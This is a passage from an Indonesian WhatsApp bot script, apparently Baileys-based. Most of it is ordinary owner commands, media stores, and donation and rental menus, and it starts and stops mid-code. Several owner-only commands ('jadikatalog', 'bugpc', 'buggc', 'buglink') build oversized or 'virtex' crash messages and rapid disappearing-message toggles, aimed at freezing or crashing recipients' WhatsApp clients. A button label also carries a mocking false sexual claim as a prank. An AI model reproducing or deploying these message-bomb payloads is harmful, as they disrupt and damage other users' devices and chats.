sendMediaURL(from, rume.data.result)
} else {
const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const media = await Hanz.downloadAndSaveMediaMessage(encmedia)
ran = '1000.png'
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(mess.error.api)
buffer = fs.readFileSync(ran)
Hanz.sendMessage(from, buffer, image, {quoted: mek, thumbnail:virgam, caption: 'Nih Dah Jadi Di coba dulu asu'})
fs.unlinkSync(ran)
})
}
break
case 'jadikatalog':
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
sticWait(from)
if (!q) return replyy('(jadivcatalog teksnya + reply gambar nya')
const tokatalog = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
vkatalog = await Hanz.downloadMediaMessage(tokatalog)
imeu = await Hanz.prepareMessage('0@s.whatsapp.net', vkatalog, image)
imeg = imeu.message.imageMessage
y = await Hanz.prepareMessageFromContent(from,{
"productMessage": {
"product": {
"productImage": imeg, 
"title": `${q}͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏`,
"description": `🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥️️`,
"currencyCode": "USD",
"priceAmount1000": "0",
"productImageCount": 1,
"firstImageId": 1,
"contentText": `🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🌀🌀🌀🌀🌀🌀🌀🌀🌀🇸🇬🌀🇸🇬🇸🇬🌀🇸🇬🇸🇬🌀🌀🌀🌀🌀🌀🌀🌀🌀🌀🌀🌀🌀🌀🌀🌀🌀🌀`,           
"footerText": `🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭`,
"salePriceAmount1000": "99.99999999999999999999",         
"retailerId": `KATALOG NEW ERA`,
"url": "Haris Ganteng"                       
},
"businessOwnerJid": "6283144394823@s.whatsapp.net",
}
}, { quoted: mek, thumbnail:td, mimetype: 'image/jpeg' })
Hanz.relayWAMessage(y)		
break
case 'bugpc':
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
res = await Hanz.prepareMessageFromContent(from,{
"groupInviteMessage": {
"groupJid": "6283144394823@g.us",
"inviteCode": "UkJdqTXupAtmDwo4",
"inviteExpiration": "1643553084",
"invitetime": "1643293887000",
"groupName": `HANZ々OFC彡🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥${virtex7(prefix)}🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥${api(prefix)}️️`,
"thumbnail": virgam,           //INI JUGA GW TAMBAHIN VIRTEX BIAR GANAS WKWK ASu
"caption": `BUG INVITE🎭 BY : HANZ々OFC彡`,
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}, {quoted:ftrol, contextInfo:{}})
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
Hanz.relayWAMessage(res)
await setTimeout(() => {
}, 3000)
break
case 'buggc'://BUG OLD VERSI GW SOALNYA BASE INI GK SUPPOT BUGGC 
//NEMU EVAL NYA SUSAH ASW
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(7 * 24 * 60 * 60),{}),{ waitForAck: true });
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(7 * 24 * 60 * 60),{}),{ waitForAck: true });
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(7 * 24 * 60 * 60),{}),{ waitForAck: true });
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(7 * 24 * 60 * 60),{}),{ waitForAck: true });
break          
case 'buglink':
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
var group = await Hanz.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Hanz.sendMessage(from, virtex7(prefix), text, { quoted:ftrol, contextInfo :{text: '🔥',
"forwardingScore": 1000000000,
isForwarded: true,
sendEphemeral: false,
"externalAdReply": {
"title": `${virtex2(prefix)}${virtex7(prefix)}${virtex9(prefix)}`,
"body": "",
"previewType": "PHOTO",
"thumbnailUrl": "https://i.ibb.co/3hrZZ6s/Manik.png",
"thumbnail": fs.readFileSync(`./media/thumnail.jpg`),
"sourceUrl": "https://www.instagram.com/invites/contact/?i=1px0y5705mg05&utm_content=kkko0zr"}}})
break             
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[FITUR OWNER]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
case 'addcmd': 
case 'setcmd':
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
if (isQuotedSticker) {
if (!q) return replyy(`Penggunaan :  cmdnya dan tag stickernya`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
addCmd(kodenya, q)
replyy("Done Bwang")
} else {
replyy('tag stickenya')
}
break
case 'delcmd':
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
if (!isQuotedSticker) return replyy(`Penggunaan : ${command} tagsticker`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
scommand.splice(getCommandPosition(kodenya), 1)
fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
replyy("Done Bwang")
break
case 'listcmd':
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
let cemde = [];
for (let i of scommand) {
cemde.push(i.id)
teksnyee += `\n\n*•> ID :* ${i.id}\n*•> Cmd :* ${i.chats}`
}
replyy(teksnyee)
break
case 'autoread':
if (!isOwner && !mek.key.fromMe) return
if (args.length < 1) return replyy(`Example:\n${prefix}autoread gc on`)
if (args[0] === "gc") {
if (args.length < 2) return replyy(`Example:\n${prefix}autoread gc on`)
if (args[1] === "on") {
if (readG === true) return
readG = true
replyy(`Succes mengaktifkan autoread group`)
} else if (args[1] === "off") {
if (readG === false) return
readG = false
replyy(`Succes mematikan autoread group`)
} else {
replyy(`Pilih on atau off`)
}
} else if (args[0] === "pc") {
if (args.length < 2) return replyy(`Example:\n${prefix}autoread pc on`)
if (args[1] === "on") {
if (readP === true) return
readP = true
replyy(`Succes mengaktifkan autoread pribadi`)
} else if (args[1] === "off") {
if (readP === false) return
readP = false
replyy(`Succes mematikan autoread pribadi`)
} else {
replyy(`Pilih on atau off`)
}
} else {
replyy(`*List Auto Read*\n•> gc\n•> pc`)
}
break                  
case 'auto':{
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (!q) return 
if (
args[0].toLowerCase() === 'ngetik' ||
args[0].toLowerCase() === 'ketik' ||
args[0].toLowerCase() === 'typing'
									){
ngetik = true
autovn = false
replyy(`Sukses....`)
} else if (
args[0].toLowerCase() === 'voicenote' ||
args[0].toLowerCase() === 'recording' ||
args[0].toLowerCase() === 'vn' 
){
ngetik = false
autovn = true
replyy(`Sukses...`)
} else {
}
}
break
case 'shutdown':
if (!isOwner && !mek.key.fromMe) return replay(only.OwnerBot)
replyy(`Bye...`)
await sleep(3000)
process.exit()
break
case 'del':
case 'd':
Hanz.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
break
case 'restart':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
replyy(`_Restarting ${botname}_`)
exec(`cd &&  node index`)
sleep(4000)
replyy('Sukses')
break								
case 'set' :
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
but = [
{ buttonId: '.self', buttonText: { displayText: 'Self' }, type: 1 },
{ buttonId: '.public', buttonText: { displayText: 'Public' }, type: 1 }
]
sendButton(from, "Silahkan pilih self/public Di Bawah", faketeks, but, mek)
break
case 'setppbot':
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await Hanz.downloadMediaMessage(boij)
fs.writeFileSync(`./media/thumnail.jpg`, delb)
fakeimage = fs.readFileSync(`./media/thumnail.jpg`)
replyy(`Sukses cok`)
break
case 'setppwa':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
Hanz.updatePresence(from, Presence.composing) 
if (!isQuotedImage) return replyy(`Kirim gambar dengan caption ${prefix}setbotpp atau tag gambar yang sudah dikirim`)
enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await Hanz.downloadAndSaveMediaMessage(enmedia)
await Hanz.updateProfilePicture(botNumber, media)
replyy('SUKSES!!!')			  
break		
case 'public':
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
publik = true
replyy('Sukses mengubah mode self ke public')
break
case 'self':
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
publik = false
replyy('Sukses mengubah mode public ke self')
break
case 'ban':
bnnd = body.slice(5)
ban.push(`${bnnd}@s.whatsapp.net`)
fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
replyy(`*@${bnnd}*\n_Telah Berhasil Dibanned ✓_`)
break
case 'unban':
bnnd = body.slice(7)
ban.splice(`${bnnd}@s.whatsapp.ne5t`)
fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
repy(`*@${bnnd}*\n_Telah Sukses Diunbanned ✓_`)
break
case 'addprem':
prmm = body.slice(9)
prem.push(`${prmm}@s.whatsapp.net`)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replyy(`*@${prmm}*\n_Berhasil Add User Premium ✓_`)
break
case 'delprem':
prmm = body.slice(9)
prem.splice(`${prmm}@s.whatsapp.ne5t`)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replyy(`*@${prmm}*\n_Berhasil Delete User Premium ✓_`)
break
case 'addsticker':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedSticker) return replyy('Reply stiker')
nm = body.slice(12)
if (!nm) return replyy('Nama sticker nya apa?')
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await Hanz.downloadMediaMessage(boij)
setik.push(`${nm}`)
fs.writeFileSync(`./media/database/sticker/${nm}.webp`, delb)
fs.writeFileSync('./database/setik.json', JSON.stringify(setik))
Hanz.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}liststicker*`, MessageType.text, { quoted: mek })
break
case 'delsticker':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
try {
nmm = body.slice(12)
wanu = setik.indexOf(nmm)
setik.splice(wanu, 1)
fs.unlinkSync(`./media/database/sticker/${nmm}.webp`)
reply(`Sukses menghapus sticker ${body.slice(12)}`)
} catch (err){
console.log(err)
reply(mess.error.api)
}
break
case 'stickerlist':
case 'liststicker':
teks = 'Sticker List :\n\n'
for (let awokwkwk of setik) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${setik.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama sticker_`
Hanz.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setik } })
break
case 'addvn':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedAudio) return replyy('Reply audio')
nm = body.slice(7)
if (!nm) return replyy('Nama vn nya apa?')
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await Hanz.downloadMediaMessage(boij)
vien.push(`${nm}`)
fs.writeFileSync(`./media/database/vn/${nm}.mp3`, delb)
fs.writeFileSync('./database/vien.json', JSON.stringify(vien))
Hanz.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listvn*`, MessageType.text, { quoted: mek })
break
case 'delvn':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
try {
 nmm = body.slice(7)
 wanu = vien.indexOf(nmm)
 vien.splice(wanu, 1)
 fs.unlinkSync(`./media/database/vn/${nmm}.mp3`)
reply(`Sukses menghapus vn ${body.slice(7)}`)
} catch (err){
	console.log(err)
	reply(mess.error.api)
}
break
				case 'vnlist':
				case 'listvn':
teks = '*VN List :*\n\n'
for (let awokwkwk of vien) {
	teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${vien.length}*\n\n_Untuk mengambil vn silahkan reply pesan ini dengan caption nama vn_`
Hanz.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": vien } })
break
case 'addimage':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedImage) return replyy('Reply image')
nm = body.slice(10)
if (!nm) return replyy('Nama image nya apa?')
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await Hanz.downloadMediaMessage(boij)
imagi.push(`${nm}`)
fs.writeFileSync(`./media/database/image/${nm}.jpg`, delb)
fs.writeFileSync('./database/imagi.json', JSON.stringify(imagi))
Hanz.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listimage*`, MessageType.text, { quoted: mek })
break
case 'delimage':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
try {
 nmm = body.slice(10)
 wanu = imagi.indexOf(nmm)
 imagi.splice(wanu, 1)
 fs.unlinkSync(`./media/database/image/${nmm}.jpg`)
 reply(`Sukses menghapus image ${body.slice(10)}`)
} catch (err){
	console.log(err)
	reply(mess.error.api)
}
break
case 'imagelist':
case 'listimage':
teks = '*Image List :*\n\n'
for (let awokwkwk of imagi) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${imagi.length}*\n\n_Untuk mengambil image silahkan reply pesan ini dengan caption nama image_`
Hanz.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagi } })
break
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[FITUR BOT/INFO BOT]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
case 'owner':
let inilist = []
for (let i of ownerNumber) {
let vname = Hanz.contacts[i] != undefined ? Hanz.contacts[i].vname || Hanz.contacts[i].notify : undefined
inilist.push({
"displayName": 'ZeroYT7',
"vcard": 'BEGIN:VCARD\n'
+ 'VERSION:3.0\n'
+ `FN:${ownername}\n`
+ `ORG: Creator ${ownername} ;\n`
+ `TEL;type=CELL;type=VOICE;waid=${owner}:${owner}\n`
+ 'END:VCARD'.trim()
})
}
hehe = await Hanz.sendMessage(from, {
"displayName": `${inilist.length} kontak`,
"contacts": inilist 
}, 'contactsArrayMessage', { quoted: ftrol })
button = [
  {buttonId: '.youtube', buttonText: {displayText: '☰ YOUTUBE'}, type: 1},
  {buttonId: '.instagram', buttonText: {displayText: '☰ INSTAGRAM'}, type: 1},
  {buttonId: '.tiktok', buttonText: {displayText: '☰ TIKTOK'}, type: 1}
]
 buttons = {
    contentText: 'Nih Nomer Owner Ku Mau Tau Tentang Apa Ya ?',
    footerText: faketeks,
    buttons: button,
    headerType: 1
}
await Hanz.sendMessage(from, buttons, MessageType.buttonsMessage, {quoted: ftrol})
break
case 'sosmed':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
teks =
`┏━➤ 「 All Sosmed 👥」
┃┃✯ INSTAGRAM : wong_koclok_
┃┃✯ YOU TUBE : HANZ々OFC彡
┃┃✯ GITHUB : HARISGANZ
┗━━━━━━━`
gam = fs.readFileSync('./media/thumnail.jpg')
but = [
{ buttonId: `${prefix}follow`, buttonText: { displayText: 'FOLLOW' }, type: 1 },
{ buttonId: `${prefix}subscribe`, buttonText: { displayText: 'SUBSCRIBE' }, type: 1 },
{ buttonId: `${prefix}sc`, buttonText: { displayText: 'GITHUB' }, type: 1 }
]
sendButImage(from, teks, "©ʜᴀɴᴢ々ᴏꜰᴄ", gam, but)
break
case 'follow':
replyy('https://www.instagram.com/invites/contact/?i=1kn')
break
case 'yt':
replyy('https://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw')
break
case 'info':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
teks =
`┏━➤ 「 INFO NE COK 」
┃┃✯ Nama Bot : ${botname}
┃┃✯ Prefix : Multi
┃┃✯ Platform : Ubuntu Linux
┃┃✯ Runtime : ${runtime(process.uptime())}
┃┃✯ Sc Bot : https://youtube.com/channel/HANZ々OFC彡
┗━━━━━━━`
gam = fs.readFileSync('./media/thumnail.jpg')
but = [
{ buttonId: `${prefix}menu`, buttonText: { displayText: 'BACK TO MENU' }, type: 1 },
{ buttonId: `${prefix}donasi`, buttonText: { displayText: 'DONASI' }, type: 1 },
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'OWNER' }, type: 1 }
]
sendButImage(from, teks, "©ʜᴀɴᴢ々ᴏꜰᴄ", gam, but)
break
case 'sc':
case 'script':
sendButtonLocation(from, 
        `╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞Script Bot──➤ ↶↷*
╰•͙✩̣̣̣̣
⁙┃〲◦➛Link Sc: http://bit.ly/3vJZJ7n
⁙┃〲◦➛Link Donasi: https://saweria.co/harisnew
⁙┃〲◦➛Link Instagram: https://www.instagram.com/wong_koclok_
⁙┃〲◦➛Link You Tube: https://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw
⁙╰•▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: `Ok‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n\nSemuanya aku mau Jujur Kalau aku itu Gay dan Lagi Pengen Sama Cowok berotot untuk jadi Pacarku, yang Berminat Bisa Chat aku yahh 😋`, }, type: 1 }])
break 
case 'donasi':
teks = `Kalo Gk ikhlas Ngak usah donasi:v

Makasih Kalo Mau Donasi Beneran
Semoga Rejekinya Tambah Lancar Amin

╔═════════════════⎉
║冬GOPAY : 083144394823
║冬DANA : 083144394823
║冬OVO : 083144394823
║冬PULSA : 083144394823
║冬SAWERIA : https://saweria.co/harisnew
╚═════════════════❍ `
gam = fs.readFileSync('./media/sewabot.jpg')
but = [         
{ buttonId: `${prefix}info`, buttonText: { displayText: 'INFO' }, type: 1 },
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'OWNER' }, type: 1 }
]
sendButImage(from, teks, "HANZ々OFC彡", gam, but)
break
case 'gk':
teks = `Gk Jadi Wajib Donate Awokawok

╔═════════════════⎉
║冬GOPAY : 083144394823
║冬DANA : 083144394823
║冬OVO : 083144394823
║冬PULSA : 083144394823
║冬SAWERIA : https://saweria.co/harisnew
╚═════════════════❍ `
gam = fs.readFileSync('./media/sewabot.jpg')
but = [         
{ buttonId: `${prefix}info`, buttonText: { displayText: 'INFO' }, type: 1 },
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'OWNER' }, type: 1 }
]
sendButImage(from, teks, "HANZ々OFC彡", gam, but)
break
case 'sewabot':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
teks =
`╔══❒LIST JASA WA BOT❒══⎉
║冬Seminggu : 5.000
║冬Sebulan : 10.000
║冬Permanen : 15.000
╚═══════════════════❍ 
╔═════❒FITUR BOT❒═════⎉
║冬STICKER
║冬WELCOME GG
║冬ANTIVIRTEX
║冬ANTILINK
║冬BUAT JAGA GRUP
║冬DLL
╚═══════════════════❍ 
╔══❒KEUNGGULAN BOT❒══⎉
║冬SELALU UPDATE
║冬ON 24 JAM
╚═══════════════════❍ 
Jika Ingin Sewa Bot
Silahkan Pilih Metode Pembayaran
Dibawah Ini`
gam = fs.readFileSync('./media/sewabot.jpg')
but = [
{ buttonId: `${prefix}gopay`, buttonText: { displayText: 'GOPAY' }, type: 1 },
{ buttonId: `${prefix}dana`, buttonText: { displayText: 'DANA' }, type: 1 },
{ buttonId: `${prefix}ovo`, buttonText: { displayText: 'OVO' }, type: 1 }
]
sendButImage(from, teks, "Pilih Metode Pembayarannya🤑", gam, but)
break
case 'gopay':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
but = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'DONE' }, type: 1 }
]
sendButton(from, `GOPAY : 0${Nogopay}`, faketeks, but, mek)
break
case 'dana':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
but = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'DONE' }, type: 1 }
]
sendButton(from, `DANA : 0${Nodana}`, faketeks, but, mek)
break
case 'ovo':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
but = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'DONE' }, type: 1 }
]
sendButton(from, `OVO : 0${Noovo}`, faketeks, but, mek)
break
case "runtime":
case "test":
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
run = process.uptime();
teks = `${kyun(run)}`;
replyy(teks);
break;
case "speed":
case "ping":
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
const timestamp = speed();
const latensi = speed() - timestamp;
exec(`neofetch --stdout`, (error, stdout, stderr) => {
const child = stdout.toString("utf-8");
const ssd = child.replace(/Memory:/, "Ram:");
